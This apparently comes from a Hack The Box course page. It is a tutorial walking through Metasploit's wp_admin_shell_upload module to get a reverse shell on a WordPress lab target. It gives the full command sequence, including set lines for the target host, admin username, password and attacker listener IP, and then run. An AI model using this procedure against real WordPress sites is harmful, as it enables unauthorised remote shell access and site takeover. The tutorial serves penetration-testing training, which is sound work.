<h3>Attacking WordPress with Metasploit</h3>

Automating WordPress Exploitation

We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.

We can quickly start MSF by issuing the following command:

Starting Metasploit Framework

@htb[/htb]$ msfconsole

To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:

<h3>MSF Search</h3>

msf5 > search wp_admin

The number 0 in the search results represents the ID for the suggested modules. From here on, we can specify the module by its ID number to save time.

<h3>Module Selection</h3>

msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >

Module Options

Each module offers different settings options that we can use to assign precise specifications to MSF to ensure the attack's success. We can list these options by issuing the following command:

<h3>List Options</h3>

msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

<h3>Exploitation</h3>

After using the set command to make the necessary modifications, we can use the run command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution.

<h3>Set Options</h3>

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020

msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8

msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
